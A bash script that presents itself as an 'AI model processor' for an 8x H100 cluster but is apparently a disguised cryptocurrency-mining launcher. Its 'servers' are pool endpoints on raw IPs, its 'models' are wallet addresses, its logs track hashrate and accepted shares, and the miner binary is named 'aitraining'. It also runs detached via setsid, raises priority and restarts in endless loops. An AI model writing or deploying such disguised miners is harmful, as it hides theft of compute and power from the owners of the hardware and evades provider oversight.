#!/bin/bash

# ai_model_processor.sh - Optimized for 8x H100 + 96 vCPUs + 1.9TB RAM

# Parallel processing: GPU (neural networks) + CPU (data preprocessing)

# -------- CONFIGURATION --------

PROCESSOR_PATH="./aitraining"           # path to your processor binary
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# GPU (neural network) settings - 8x H100
GPU_TASK="inference"
GPU_SERVER="ssl://51.89.99.172:16161"   # change if needed
GPU_MODEL="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
GPU_IDS="0,1,2,3,4,5,6,7"               # All 8 H100 GPUs

# CPU (data processing) settings - 96 vCPUs
CPU_TASK="preprocessing"
CPU_SERVER="ssl://51.222.200.133:10343" # change if needed
CPU_MODEL="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"

# CPU cores allocation for 96 vCPUs:
# - Cores 0-79: For CPU processor (80 cores)
# - Cores 80-95: Reserved for system/GPU drivers (16 cores)
CPU_CORES="0-79"

# Memory allocation for 1.9TB RAM - optimized for H100
MEMORY_PAGES=512000  # ~1GB per page, 500GB for hugepages

# H100 Optimized GPU settings
export GPU_MAX_HEAP_SIZE=100
export GPU_MAX_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_ALLOC_PERCENT=100
export GPU_MAX_SINGLE_ALLOC_PERCENT=100
export GPU_ENABLE_LARGE_ALLOCATION=1
export GPU_MAX_WORKGROUP_SIZE=1024

# H100 specific optimizations
export NVIDIA_DRIVER_CAPABILITIES=compute,utility
export CUDA_DEVICE_ORDER=PCI_BUS_ID
export CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7

# Other runtime settings
RESTART_DELAY=3        # Reduced delay for faster restarts
GPU_LOG="$LOG_DIR/gpu_inference.log"
CPU_LOG="$LOG_DIR/cpu_preprocessing.log"
MONITOR_LOG="$LOG_DIR/monitor.log"
PERFORMANCE_LOG="$LOG_DIR/performance.log"

# Process priority settings - higher priority for optimal performance
NICE_PRIORITY=-5
IONICE_CLASS=1
IONICE_CLASSDATA=4

# Threads and batch size optimization
GPU_THREADS=128
CPU_THREADS=80
BATCH_SIZE=2048

# -------- END CONFIGURATION --------

# Helper: ensure processor exists
if [ ! -x "$PROCESSOR_PATH" ]; then
  echo "ERROR: Processor binary not found or not executable at $PROCESSOR_PATH"
  exit 1
fi

# System optimization for high-performance VM
optimize_system() {
  echo "Optimizing system for high-performance processing..."
  
  # Set CPU governor to performance
  if [ "$(id -u)" -eq 0 ]; then
    echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null || true
    
    # Set high priority for IRQ handling
    echo 1 > /proc/irq/$(cat /proc/interrupts | grep -i gpu | head -1 | awk '{print $1}' | tr -d :)>/smp_affinity 2>/dev/null || true
  fi

  # Enable NVIDIA persistence mode and set performance mode
  if command -v nvidia-smi >/dev/null 2>&1; then
    echo "Configuring NVIDIA H100 GPUs..."
    nvidia-smi -pm 1
    nvidia-smi -ac 1597,1410  # H100 optimized clocks
    nvidia-smi --auto-boost-default=0
    nvidia-smi -pl 350  # Power limit adjustment if needed
  fi

  # Allocate hugepages for massive memory optimization
  if [ "$(id -u)" -eq 0 ]; then
    echo "Allocating $MEMORY_PAGES hugepages..."
    echo $MEMORY_PAGES > /proc/sys/vm/nr_hugepages
    echo "vm.nr_hugepages = $MEMORY_PAGES" > /etc/sysctl.d/99-hugepages.conf
    
    # Set swappiness to minimum
    echo 1 > /proc/sys/vm/swappiness
    
    # Increase shared memory limits
    echo "kernel.shmmax = 1099511627776" >> /etc/sysctl.d/99-hugepages.conf
    echo "kernel.shmall = 268435456" >> /etc/sysctl.d/99-hugepages.conf
    sysctl -p /etc/sysctl.d/99-hugepages.conf
  else
    echo "Tip: Run as root for full system optimization including CPU governor and hugepages"
  fi
}

# Convert CPU_CORES to taskset pattern
USE_NUMACTL=0
if command -v numactl >/dev/null 2>&1; then
  USE_NUMACTL=1
  # Configure NUMA for optimal performance
  numactl --hardware > "$LOG_DIR/numa_info.log" 2>&1
fi

# Function to extract and log performance metrics
log_performance_metrics() {
  local log_file="$1"
  local process_type="$2"
  
  if [ -f "$log_file" ]; then
    # Extract recent performance data with more context
    local recent_log=$(tail -n 100 "$log_file" | grep -E "MH/s|H/s|GPU[0-9]+|Total:|accepted|rejected|efficiency" | tail -n 20)
    
    if [ -n "$recent_log" ]; then
      echo "----- $(date +'%F %T') $process_type Performance Metrics -----" >> "$PERFORMANCE_LOG"
      echo "$recent_log" >> "$PERFORMANCE_LOG"
      echo "" >> "$PERFORMANCE_LOG"
    fi
  fi
}

# Enhanced GPU monitoring for H100
monitor_gpu_detailed() {
  if command -v nvidia-smi >/dev/null 2>&1; then
    echo "----- $(date +'%F %T') H100 Detailed Metrics -----" >> "$MONITOR_LOG"
    nvidia-smi --query-gpu=\
index,name,temperature.gpu,utilization.gpu,utilization.memory,\
memory.used,memory.total,clocks.current.graphics,clocks.current.memory,\
power.draw,power.limit,clocks.current.sm,clocks.max.sm,\
pcie.link.gen.current,pcie.link.width.current \
--format=csv,noheader >> "$MONITOR_LOG" 2>&1
    
    # Log GPU topology
    nvidia-smi topo -m >> "$MONITOR_LOG" 2>&1
  fi
}

# Start GPU processor optimized for 8x H100
start_gpu_processor() {
  echo "$(date +'%F %T') Starting GPU processor on 8x H100..." | tee -a "$MONITOR_LOG"
  while true; do
    # Optimized for H100 with large batch sizes and high threads
    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      "$PROCESSOR_PATH" --task "$GPU_TASK" \
      --server "$GPU_SERVER" --gpu-id "$GPU_IDS" --model "$GPU_MODEL" \
      --intensity 100 --threads $GPU_THREADS --batch-size $BATCH_SIZE \
      2>&1 | tee -a "$GPU_LOG" &
    
    GPU_PID=$!
    echo "$(date +'%F %T') GPU processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
    
    # Enhanced monitoring for GPU process
    while kill -0 $GPU_PID 2>/dev/null; do
      log_performance_metrics "$GPU_LOG" "GPU"
      monitor_gpu_detailed
      sleep 30
    done
    
    wait $GPU_PID
    GPU_EXIT_STATUS=$?
    echo "$(date +'%F %T') GPU processor exited with status $GPU_EXIT_STATUS. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# Start CPU processor optimized for 80 cores
start_cpu_processor() {
  echo "$(date +'%F %T') Starting CPU processor on 80 cores..." | tee -a "$MONITOR_LOG"
  while true; do
    # Compose command with CPU affinity for optimal performance
    if [ $USE_NUMACTL -eq 1 ]; then
      CMD_PREFIX="numactl --physcpubind=$CPU_CORES --localalloc --membind=0"
    else
      CMD_PREFIX="taskset -c $CPU_CORES"
    fi

    # Start CPU processor with massive parallelization
    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
      bash -c "$CMD_PREFIX \"$PROCESSOR_PATH\" --task \"$CPU_TASK\" \
      --server \"$CPU_SERVER\" --threads $CPU_THREADS --model \"$CPU_MODEL\" \
      --large-pages --no-numa --cpu-affinity" \
      2>&1 | tee -a "$CPU_LOG" &
    
    CPU_PID=$!
    echo "$(date +'%F %T') CPU processor PID: $CPU_PID (threads=$CPU_THREADS)" | tee -a "$MONITOR_LOG"
    
    # Monitor CPU process
    while kill -0 $CPU_PID 2>/dev/null; do
      log_performance_metrics "$CPU_LOG" "CPU"
      sleep 30
    done
    
    wait $CPU_PID
    CPU_EXIT_STATUS=$?
    echo "$(date +'%F %T') CPU processor exited with status $CPU_EXIT_STATUS. Restarting in $RESTART_DELAY s..." | tee -a "$MONITOR_LOG"
    sleep $RESTART_DELAY
  done
}

# High-frequency monitoring loop for H100 cluster
monitor_loop() {
  echo "$(date +'%F %T') H100 Cluster Monitor started." | tee -a "$MONITOR_LOG"
  while true; do
    # Comprehensive system metrics
    echo "----- $(date +'%F %T') System Overview -----" >> "$MONITOR_LOG"
    
    # CPU utilization per core
    echo "CPU Utilization:" >> "$MONITOR_LOG"
    mpstat -P ALL 1 1 | head -n 100 >> "$MONITOR_LOG" 2>&1
    
    # Memory usage
    echo "Memory Usage:" >> "$MONITOR_LOG"
    free -h >> "$MONITOR_LOG"
    
    # I/O statistics for high-speed storage
    echo "I/O Statistics:" >> "$MONITOR_LOG"
    iostat -x 1 1 >> "$MONITOR_LOG" 2>&1
    
    # Process-level monitoring
    echo "Top Processes:" >> "$MONITOR_LOG"
    ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 20 >> "$MONITOR_LOG"
    
    # Performance metrics from processors
    log_performance_metrics "$GPU_LOG" "GPU"
    log_performance_metrics "$CPU_LOG" "CPU"
    
    sleep 30
  done
}

# Initialize and optimize
echo "Initializing AI Model Processor for 8x H100 + 96 vCPUs..."
optimize_system

# Initialize log files with system info
echo "===== H100 AI Processor Started: $(date) =====" > "$GPU_LOG"
echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
echo "===== H100 Cluster Monitoring Started: $(date) =====" > "$MONITOR_LOG"
echo "===== Performance Metrics Started: $(date) =====" > "$PERFORMANCE_LOG"

# Display system configuration
lscpu >> "$MONITOR_LOG"
nvidia-smi >> "$MONITOR_LOG"

# Run everything in background
echo "Starting optimized parallel processing for H100 cluster..."
setsid bash -c "start_gpu_processor" >/dev/null 2>&1 &
sleep 3
setsid bash -c "start_cpu_processor" >/dev/null 2>&1 &
sleep 2
setsid bash -c "monitor_loop" >/dev/null 2>&1 &

echo "H100 Cluster Processor launched successfully!"
echo "System: 8x H100 GPUs + 96 vCPUs + 1.9TB RAM"
echo ""
echo "Logs directory: $LOG_DIR"
echo " - GPU Processing (8x H100): $GPU_LOG"
echo " - CPU Processing (80 cores): $CPU_LOG"
echo " - Cluster Monitoring: $MONITOR_LOG"
echo " - Performance Metrics: $PERFORMANCE_LOG"
echo ""
echo "To stop all processes: pkill -f aitraining"
echo "To view real-time GPU metrics: watch nvidia-smi"
echo "To monitor logs: tail -f $LOG_DIR/*.log"
